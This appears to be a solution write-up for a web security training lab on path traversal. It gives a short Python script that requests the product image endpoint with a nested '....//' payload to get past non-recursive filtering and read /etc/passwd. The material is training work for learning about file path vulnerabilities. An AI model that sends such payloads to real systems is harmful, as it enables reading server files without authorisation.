# File path traversal, traversal sequences stripped non-recursively

> This lab contains a path traversal vulnerability in the display of product images.
> The application strips path traversal sequences from the user-supplied filename before using it.
> To solve the lab, retrieve the contents of the `/etc/passwd` file.

```python
import requests

# --- Configuration ---
# Lab: File path traversal, traversal sequences stripped non-recursively
# Replace with your specific lab ID
BASE_URL = "https://0aa400f6049212e582fbb07000f1007d.web-security-academy.net/"

def exploit_nested_traversal(base_url):
    """
    Exploits path traversal by using nested sequences (....//)
    to bypass non-recursive stripping filters.
    """
    # Target Endpoint
    # The filter strips 't ../' once, collapsing '....//' into '../'
    target_url = base_url + "/image?filename=....//....//....//etc/passwd"
    
    print(f"[*] Sending payload to: {target_url}")
    
    # Send GET request
    response = requests.get(target_url)
    
    # Verify and print output
    if "root:x:0:0" in response.text:
        print("[+] Success! /etc/passwd retrieved:\n")
        print(response.text)
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    exploit_nested_traversal(BASE_URL)
```